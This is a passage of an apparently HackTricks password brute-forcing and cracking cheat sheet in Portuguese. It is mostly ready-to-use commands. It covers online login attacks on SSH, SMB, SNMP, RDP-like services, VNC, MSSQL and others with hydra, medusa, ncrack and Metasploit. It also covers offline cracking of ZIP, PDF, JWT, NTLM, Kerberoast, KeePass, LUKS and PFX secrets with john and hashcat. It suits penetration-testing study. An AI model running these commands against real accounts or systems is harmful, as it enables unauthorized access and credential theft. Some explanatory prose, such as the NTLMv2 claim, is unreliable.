nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

O Protocolo de Transmissão em Tempo Real (RTSP) é um protocolo de controle usado para estabelecer e controlar sessões de mídia contínuas entre clientes e servidores. Ele é usado principalmente para streaming de vídeo e áudio. O RTSP é baseado em solicitações e respostas, semelhante ao HTTP. As solicitações são enviadas pelo cliente para o servidor, que responde com uma mensagem de status e, possivelmente, com dados adicionais. O RTSP é frequentemente usado em câmeras de segurança e sistemas de vigilância. 

O brute force em RTSP é geralmente usado para tentar adivinhar senhas de câmeras de segurança e outros dispositivos que usam o protocolo RTSP. O ataque de brute force em RTSP é semelhante a outros ataques de brute force, onde um atacante tenta adivinhar uma senha usando uma lista de senhas comuns ou geradas aleatoriamente. O ataque pode ser feito manualmente ou usando ferramentas automatizadas, como o Hydra. É importante notar que o brute force em RTSP pode ser ilegal e deve ser usado apenas para fins de teste em sistemas autorizados.
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

SNMP (Simple Network Management Protocol) é um protocolo padrão para gerenciamento de dispositivos em redes IP. Ele permite que os administradores monitorem e gerenciem dispositivos de rede, como roteadores, switches, servidores e impressoras, entre outros. O SNMP usa uma arquitetura cliente-servidor, onde o servidor é o dispositivo gerenciado e o cliente é o software de gerenciamento de rede. O SNMP usa uma estrutura de dados hierárquica chamada MIB (Management Information Base) para armazenar informações sobre o dispositivo gerenciado. Os ataques de força bruta ao SNMP geralmente visam adivinhar as credenciais de autenticação do SNMP, como a comunidade SNMP.
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

O Protocolo SMB (Server Message Block) é um protocolo de compartilhamento de arquivos em rede usado principalmente em sistemas operacionais Windows. O SMB é vulnerável a ataques de força bruta, que podem ser usados para obter acesso não autorizado a compartilhamentos de arquivos e pastas.

Existem várias ferramentas de força bruta disponíveis para atacar o SMB, incluindo o Hydra e o SMBMap. Essas ferramentas podem ser usadas para tentar adivinhar senhas de usuários e obter acesso a compartilhamentos de arquivos protegidos por senha.

Para se proteger contra ataques de força bruta SMB, é importante usar senhas fortes e complexas e implementar medidas de segurança, como bloqueio de contas após várias tentativas de login malsucedidas. Além disso, é recomendável limitar o acesso a compartilhamentos de arquivos apenas a usuários autorizados e monitorar o tráfego de rede em busca de atividades suspeitas.
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
### SMTP

SMTP (Simple Mail Transfer Protocol) é um protocolo padrão para envio de e-mails através da internet. É comumente usado por servidores de e-mail para enviar e-mails de um remetente para um ou mais destinatários. O SMTP geralmente usa a porta 25, mas também pode usar outras portas, como 587 ou 465. 

O brute force em servidores SMTP geralmente é usado para tentar adivinhar senhas de contas de e-mail. Isso pode ser feito usando uma lista de senhas comuns ou gerando senhas aleatórias. O brute force pode ser feito manualmente ou usando ferramentas automatizadas, como Hydra ou Medusa. 

Além disso, o SMTP pode ser usado para enviar e-mails de phishing ou spam. Os atacantes podem usar técnicas de spoofing para fazer com que o e-mail pareça ter sido enviado de um remetente legítimo. É importante estar ciente desses tipos de ataques e tomar medidas para proteger sua conta de e-mail.
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
### SOCKS

SOCKS é um protocolo de rede que permite que os pacotes de rede sejam enviados por meio de um servidor proxy. Ele pode ser usado para ocultar o endereço IP do remetente ou para contornar restrições de rede. O SOCKS pode ser usado em conjunto com outras ferramentas de hacking, como o Nmap, para ocultar o endereço IP do atacante durante a varredura de portas. Além disso, o SOCKS pode ser usado para criar túneis de rede seguros e criptografados.
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH (Secure Shell) é um protocolo de rede criptografado usado para comunicação segura entre dois sistemas. É comumente usado para acesso remoto a servidores Linux e outros dispositivos de rede. O SSH usa criptografia assimétrica para autenticar o servidor e a criptografia simétrica para proteger a comunicação entre o cliente e o servidor. O SSH é uma ferramenta poderosa para administradores de sistemas, mas também pode ser usado por hackers para obter acesso não autorizado a sistemas remotos. O brute force é uma técnica comum usada para tentar adivinhar senhas de SSH. Existem várias ferramentas disponíveis para realizar ataques de brute force em servidores SSH. É importante usar senhas fortes e autenticação de chave pública para proteger seus sistemas contra ataques de brute force.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### Chaves SSH fracas / PRNG previsível do Debian
Alguns sistemas possuem falhas conhecidas na semente aleatória usada para gerar material criptográfico. Isso pode resultar em um espaço de chaves dramaticamente reduzido, que pode ser quebrado com ferramentas como [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute). Conjuntos pré-gerados de chaves fracas também estão disponíveis, como [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

### SQL Server
```bash
#Use the NetBIOS name of the machine as domain
crackmapexec mssql <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> mssql
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mssql
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=DOMAIN,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <host> #Use domain if needed. Be careful with the number of passwords in the list, this could block accounts
msf> use auxiliary/scanner/mssql/mssql_login #Be careful, you can block accounts. If you have a domain set it and use USE_WINDOWS_ATHENT
```
### Telnet

O Telnet é um protocolo de rede que permite a comunicação remota com um dispositivo através da Internet ou de uma rede local. Ele é frequentemente usado para acessar dispositivos de rede, como roteadores, switches e servidores, para fins de gerenciamento e configuração.

O Telnet é vulnerável a ataques de força bruta, onde um atacante tenta adivinhar a senha de um dispositivo através de tentativas repetidas de login com diferentes combinações de nome de usuário e senha. Para evitar ataques de força bruta, é importante usar senhas fortes e complexas e limitar o número de tentativas de login permitidas. Além disso, é recomendável desativar o Telnet e usar protocolos mais seguros, como SSH, sempre que possível.
```bash
hydra -l root -P passwords.txt [-t 32] <IP> telnet
ncrack -p 23 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M telnet
```
### VNC

O VNC (Virtual Network Computing) é um protocolo que permite controlar remotamente um computador através de uma conexão de rede. É comum encontrar servidores VNC em ambientes corporativos para permitir que os funcionários acessem seus computadores de trabalho de forma remota. No entanto, se o servidor VNC não estiver configurado corretamente, ele pode ser vulnerável a ataques de força bruta.

Um ataque de força bruta contra um servidor VNC envolve tentar todas as combinações possíveis de nome de usuário e senha até encontrar a combinação correta. Isso pode ser feito manualmente ou com o uso de ferramentas automatizadas, como o Hydra.

Para proteger um servidor VNC contra ataques de força bruta, é importante seguir as melhores práticas de segurança, como usar senhas fortes e complexas, limitar o número de tentativas de login e usar uma conexão segura, como SSH, para acessar o servidor. Além disso, é recomendável usar uma ferramenta de monitoramento de segurança para detectar e alertar sobre tentativas de login mal-sucedidas.
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt -s <PORT> <IP> vnc
medusa -h <IP> –u root -P /root/Desktop/pass.txt –M vnc
ncrack -V --user root -P /root/Desktop/pass.txt <IP>:>POR>T
patator vnc_login host=<IP> password=FILE0 0=/root/Desktop/pass.txt –t 1 –x retry:fgep!='Authentication failure' --max-retries 0 –x quit:code=0
use auxiliary/scanner/vnc/vnc_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>

#Metasploit
use auxiliary/scanner/vnc/vnc_login
set RHOSTS <ip>
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.lst
```
### Winrm

Winrm é um protocolo de gerenciamento remoto da Microsoft que permite a execução de comandos em máquinas Windows remotas. Ele é baseado em SOAP (Simple Object Access Protocol) e usa a porta 5985 por padrão. O Winrm pode ser usado para executar comandos em uma única máquina ou em várias máquinas ao mesmo tempo, tornando-o uma ferramenta útil para gerenciamento de sistemas em larga escala. No entanto, como o Winrm permite a execução remota de comandos, ele também pode ser usado por atacantes para obter acesso não autorizado a sistemas Windows.
```bash
crackmapexec winrm <IP> -d <Domain Name> -u usernames.txt -p passwords.txt
```
## Local

### Bancos de dados de quebra de senha online

* [~~http://hashtoolkit.com/reverse-hash?~~](http://hashtoolkit.com/reverse-hash?) (MD5 e SHA1)
* [https://www.onlinehashcrack.com/](https://www.onlinehashcrack.com) (Hashes, capturas WPA2 e arquivos MSOffice, ZIP, PDF...)
* [https://crackstation.net/](https://crackstation.net) (Hashes)
* [https://md5decrypt.net/](https://md5decrypt.net) (MD5)
* [https://gpuhash.me/](https://gpuhash.me) (Hashes e hashes de arquivos)
* [https://hashes.org/search.php](https://hashes.org/search.php) (Hashes)
* [https://www.cmd5.org/](https://www.cmd5.org) (Hashes)
* [https://hashkiller.co.uk/Cracker](https://hashkiller.co.uk/Cracker) (MD5, NTLM, SHA1, MySQL5, SHA256, SHA512)
* [https://www.md5online.org/md5-decrypt.html](https://www.md5online.org/md5-decrypt.html) (MD5)
* [http://reverse-hash-lookup.online-domain-tools.com/](http://reverse-hash-lookup.online-domain-tools.com)

Verifique isso antes de tentar forçar a quebra de um hash.

### ZIP
```bash
#sudo apt-get install fcrackzip 
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' chall.zip
```

```bash
zip2john file.zip > zip.john
john zip.john
```

```bash
#$zip2$*0*3*0*a56cb83812be3981ce2a83c581e4bc4f*4d7b*24*9af41ff662c29dfff13229eefad9a9043df07f2550b9ad7dfc7601f1a9e789b5ca402468*694b6ebb6067308bedcd*$/zip2$
hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
.\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
```
#### Ataque de texto simples conhecido em arquivos zip

Você precisa saber o **texto simples** (ou parte do texto simples) **de um arquivo contido dentro** do zip criptografado. Você pode verificar **os nomes de arquivos e o tamanho dos arquivos contidos dentro** de um zip criptografado executando: **`7z l encrypted.zip`**\
Baixe o [**bkcrack**](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0) na página de lançamentos.
```bash
# You need to create a zip file containing only the file that is inside the encrypted zip
zip plaintext.zip plaintext.file

./bkcrack -C <encrypted.zip> -c <plaintext.file> -P <plaintext.zip> -p <plaintext.file>
# Now wait, this should print a key such as 7b549874 ebc25ec5 7e465e18
# With that key you can create a new zip file with the content of encrypted.zip
# but with a different pass that you set (so you can decrypt it)
./bkcrack -C <encrypted.zip> -k 7b549874 ebc25ec5 7e465e18 -U unlocked.zip new_pwd 
unzip unlocked.zip #User new_pwd as password
```
### 7z

O 7z é um formato de arquivo compactado que é usado para compactar e descompactar arquivos. Ele é usado principalmente em sistemas operacionais Windows e Linux. O 7z usa um algoritmo de compactação de alta taxa de compressão, o que significa que ele pode compactar arquivos em um tamanho menor do que outros formatos de arquivo compactado. Ele também suporta criptografia AES-256, o que torna os arquivos compactados seguros. O 7z pode ser descompactado usando ferramentas como o 7-Zip e o WinRAR.
```bash
cat /usr/share/wordlists/rockyou.txt | 7za t backup.7z
```

```bash
#Download and install requirements for 7z2john
wget https://raw.githubusercontent.com/magnumripper/JohnTheRipper/bleeding-jumbo/run/7z2john.pl
apt-get install libcompress-raw-lzma-perl
./7z2john.pl file.7z > 7zhash.john
```
### PDF

Um formato de arquivo usado para representar documentos de maneira independente do software, hardware e sistema operacional usado para criá-los. Os arquivos PDF podem conter texto, imagens, gráficos e outros elementos, e são amplamente utilizados para compartilhar documentos e formulários eletrônicos. Os arquivos PDF podem ser protegidos por senha e criptografados para garantir a segurança dos dados. Os arquivos PDF também podem ser editados com software específico, mas a edição pode ser limitada dependendo das configurações de segurança do arquivo.
```bash
apt-get install pdfcrack
pdfcrack encrypted.pdf -w /usr/share/wordlists/rockyou.txt
#pdf2john didn't work well, john didn't know which hash type was
# To permanently decrypt the pdf
sudo apt-get install qpdf
qpdf --password=<PASSWORD> --decrypt encrypted.pdf plaintext.pdf
```
### Senha do Proprietário do PDF

Para quebrar a senha do proprietário de um PDF, verifique isso: [https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/](https://blog.didierstevens.com/2022/06/27/quickpost-cracking-pdf-owner-passwords/)

### JWT
```bash
git clone https://github.com/Sjord/jwtcrack.git
cd jwtcrack

#Bruteforce using crackjwt.py
python crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc /usr/share/wordlists/rockyou.txt

#Bruteforce using john
python jwt2john.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjoie1widXNlcm5hbWVcIjpcImFkbWluXCIsXCJyb2xlXCI6XCJhZG1pblwifSJ9.8R-KVuXe66y_DXVOVgrEqZEoadjBnpZMNbLGhM8YdAc > jwt.john
john jwt.john #It does not work with Kali-John
```
### Quebra de senha NTLM

NTLM é um protocolo de autenticação usado em muitos sistemas Windows. É possível quebrar senhas NTLM usando ferramentas como `hashcat` ou `John the Ripper`. Para fazer isso, você precisa obter o hash NTLM da senha que deseja quebrar. Isso pode ser feito usando técnicas de captura de hash, como a captura de tráfego de rede ou a extração de hashes de arquivos de backup do sistema.

Uma vez que você tenha o hash NTLM, pode usar uma lista de palavras-chave ou um dicionário para tentar quebrar a senha. Isso é conhecido como ataque de força bruta. É importante notar que, se a senha for longa e complexa, pode levar muito tempo para quebrá-la usando essa técnica. Além disso, se a senha for armazenada com sal, isso tornará a quebra de senha ainda mais difícil.
```bash
Format:USUARIO:ID:HASH_LM:HASH_NT:::
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
```
### Keepass

O Keepass é um gerenciador de senhas de código aberto que permite armazenar todas as suas senhas em um único banco de dados criptografado. Ele também pode gerar senhas aleatórias e complexas para você. O Keepass é uma ótima opção para manter suas senhas seguras e organizadas.
```bash
sudo apt-get install -y kpcli #Install keepass tools like keepass2john
keepass2john file.kdbx > hash #The keepass is only using password
keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a file as a needed credential
#The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
### Keberoasting

Keberoasting é uma técnica de hacking que explora senhas fracas de contas de serviço do Windows para obter acesso a hashes de senha que podem ser facilmente quebrados. Essa técnica é particularmente eficaz em ambientes corporativos, onde as contas de serviço são comumente usadas para executar serviços em segundo plano.

O processo de Keberoasting envolve a extração de hashes de senha de contas de serviço do Windows que são armazenados em um formato criptografado no Active Directory. Esses hashes podem ser extraídos usando ferramentas como o "GetUserSPNs.py" do Impacket.

Uma vez que os hashes são extraídos, eles podem ser quebrados usando ferramentas como o "Hashcat" para obter as senhas originais. Com as senhas em mãos, um hacker pode acessar as contas de serviço e, potencialmente, obter acesso a sistemas críticos e informações confidenciais.

Para se proteger contra Keberoasting, é importante usar senhas fortes para contas de serviço do Windows e limitar o número de contas de serviço que são usadas em um ambiente. Além disso, é importante monitorar o Active Directory em busca de atividades suspeitas e implementar políticas de segurança que limitem o acesso a hashes de senha.
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Imagem Lucks

#### Método 1

Instale: [https://github.com/glv2/bruteforce-luks](https://github.com/glv2/bruteforce-luks)
```bash
bruteforce-luks -f ./list.txt ./backup.img
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
#### Método 2
```bash
cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
hashcat -m 14600 -a 0 luckshash  wordlists/rockyou.txt
cryptsetup luksOpen backup.img mylucksopen
ls /dev/mapper/ #You should find here the image mylucksopen
mount /dev/mapper/mylucksopen /mnt
```
Outro tutorial de BF para Luks: [http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1](http://blog.dclabs.com.br/2020/03/bruteforcing-linux-disk-encription-luks.html?m=1)

### MySQL
```bash
#John hash format
<USERNAME>:$mysqlna$<CHALLENGE>*<RESPONSE>
dbuser:$mysqlna$112233445566778899aabbccddeeff1122334455*73def07da6fba5dcc1b19c918dbd998e0d1f3f9d
```
### Chave privada PGP/GPG
```bash
gpg2john private_pgp.key #This will generate the hash and save it in a file
john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
```
### Cisco

<figure><img src="../.gitbook/assets/image (239).png" alt=""><figcaption></figcaption></figure>

### DPAPI Master Key

Utilize [https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py](https://github.com/openwall/john/blob/bleeding-jumbo/run/DPAPImk2john.py) e depois o john.

### Coluna protegida por senha no Open Office

Se você tiver um arquivo xlsx com uma coluna protegida por senha, você pode desprotegê-la:

* **Faça o upload para o Google Drive** e a senha será removida automaticamente
* Para **removê-la manualmente**:
```bash
unzip file.xlsx
grep -R "sheetProtection" ./*
# Find something like: <sheetProtection algorithmName="SHA-512"
hashValue="hFq32ZstMEekuneGzHEfxeBZh3hnmO9nvv8qVHV8Ux+t+39/22E3pfr8aSuXISfrRV9UVfNEzidgv+Uvf8C5Tg" saltValue="U9oZfaVCkz5jWdhs9AA8nA" spinCount="100000" sheet="1" objects="1" scenarios="1"/>
# Remove that line and rezip the file
zip -r file.xls .
```
### Certificados PFX
```bash
# From https://github.com/Ridter/p12tool
./p12tool crack -c staff.pfx -f /usr/share/wordlists/rockyou.txt
# From https://github.com/crackpkcs12/crackpkcs12
crackpkcs12 -d /usr/share/wordlists/rockyou.txt ./cert.pfx
```
![](<../.gitbook/assets/image (9) (1) (2).png>)

Use [**Trickest**](https://trickest.io/) para construir e automatizar facilmente fluxos de trabalho com as ferramentas comunitárias mais avançadas do mundo.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Ferramentas

**Exemplos de hash:** [https://openwall.info/wiki/john/sample-hashes](https://openwall.info/wiki/john/sample-hashes)

### Hash-identifier
```bash
hash-identifier
> <HASH>
```
### Listas de palavras

* **Rockyou**
* [**Probable-Wordlists**](https://github.com/berzerk0/Probable-Wordlists)
* [**Kaonashi**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/wordlists)
* [**Seclists - Passwords**](https://github.com/danielmiessler/SecLists/tree/master/Passwords)

### **Ferramentas de geração de listas de palavras**

* [**kwprocessor**](https://github.com/hashcat/kwprocessor)**:** Gerador avançado de caminhos de teclado com caracteres base configuráveis, mapa de teclas e rotas.
```bash
kwp64.exe basechars\custom.base keymaps\uk.keymap routes\2-to-10-max-3-direction-changes.route -o D:\Tools\keywalk.txt
```
### Mutação do John

Leia _**/etc/john/john.conf**_ e configure-o.
```bash
john --wordlist=words.txt --rules --stdout > w_mutated.txt
john --wordlist=words.txt --rules=all --stdout > w_mutated.txt #Apply all rules
```
### Hashcat

#### Ataques do Hashcat

* **Ataque de lista de palavras** (`-a 0`) com regras

O **Hashcat** já vem com uma **pasta contendo regras**, mas você pode encontrar [**outras regras interessantes aqui**](https://github.com/kaonashi-passwords/Kaonashi/tree/master/rules).
```
hashcat.exe -a 0 -m 1000 C:\Temp\ntlm.txt .\rockyou.txt -r rules\best64.rule
```
* **Ataque de combinação de lista de palavras**

É possível **combinar 2 listas de palavras em 1** com o hashcat.\
Se a lista 1 contiver a palavra **"hello"** e a segunda contiver 2 linhas com as palavras **"world"** e **"earth"**. As palavras `helloworld` e `helloearth` serão geradas.
```bash
# This will combine 2 wordlists
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt

# Same attack as before but adding chars in the newly generated words
# In the previous example this will generate:
## hello-world!
## hello-earth!
hashcat.exe -a 1 -m 1000 C:\Temp\ntlm.txt .\wordlist1.txt .\wordlist2.txt -j $- -k $!
```
* **Ataque de máscara** (`-a 3`)
```bash
# Mask attack with simple mask
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt ?u?l?l?l?l?l?l?l?d

hashcat --help #will show the charsets and are as follows
? | Charset
===+=========
l | abcdefghijklmnopqrstuvwxyz
u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
d | 0123456789
h | 0123456789abcdef
H | 0123456789ABCDEF
s | !"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
a | ?l?u?d?s
b | 0x00 - 0xff

# Mask attack declaring custom charset
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt -1 ?d?s ?u?l?l?l?l?l?l?l?1
## -1 ?d?s defines a custom charset (digits and specials).
## ?u?l?l?l?l?l?l?l?1 is the mask, where "?1" is the custom charset.

# Mask attack with variable password length
## Create a file called masks.hcmask with this content:
?d?s,?u?l?l?l?l?1
?d?s,?u?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?1
?d?s,?u?l?l?l?l?l?l?l?l?1
## Use it to crack the password
hashcat.exe -a 3 -m 1000 C:\Temp\ntlm.txt .\masks.hcmask
```
* Ataque de Wordlist + Máscara (`-a 6`) / Máscara + Wordlist (`-a 7`)
```bash
# Mask numbers will be appended to each word in the wordlist
hashcat.exe -a 6 -m 1000 C:\Temp\ntlm.txt \wordlist.txt ?d?d?d?d

# Mask numbers will be prepended to each word in the wordlist
hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
```
#### Modos do Hashcat
```bash
hashcat --example-hashes | grep -B1 -A2 "NTLM"
```
Quebrando Hashes do Linux - arquivo /etc/shadow
```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
```
Quebrando Hashes do Windows

Para quebrar senhas do Windows, você precisa primeiro obter o hash da senha. Isso pode ser feito de várias maneiras, incluindo a extração do hash do arquivo SAM (Security Account Manager) ou do arquivo NTDS.dit (Active Directory). Uma vez que você tenha o hash, pode usar ferramentas como o John the Ripper ou o Hashcat para quebrá-lo.

Existem vários tipos de hashes do Windows, incluindo LM, NTLM e NTLMv2. O hash LM é o mais antigo e menos seguro, enquanto o NTLMv2 é o mais recente e mais seguro. É importante notar que, se a senha original tiver mais de 14 caracteres, o Windows armazenará apenas o hash NTLMv2, mesmo em sistemas mais antigos.

Ao quebrar hashes do Windows, é importante usar uma boa lista de palavras-chave e regras para gerar senhas possíveis. Você também pode usar dicionários especializados, como o rockyou.txt, que contém milhões de senhas comuns.

Além disso, é importante lembrar que a quebra de senhas é ilegal sem permissão explícita do proprietário do sistema. Sempre obtenha permissão antes de tentar quebrar senhas.
```
3000 | LM                                               | Operating-Systems
1000 | NTLM                                             | Operating-Systems
```
Quebrando Hashes Comuns de Aplicativos
```
  900 | MD4                                              | Raw Hash
    0 | MD5                                              | Raw Hash
 5100 | Half MD5                                         | Raw Hash
  100 | SHA1                                             | Raw Hash
10800 | SHA-384                                          | Raw Hash
 1400 | SHA-256                                          | Raw Hash
 1700 | SHA-512                                          | Raw Hash
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Use [**Trickest**](https://trickest.io/) para construir e **automatizar fluxos de trabalho** facilmente, alimentados pelas ferramentas comunitárias mais avançadas do mundo.\
Obtenha acesso hoje:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
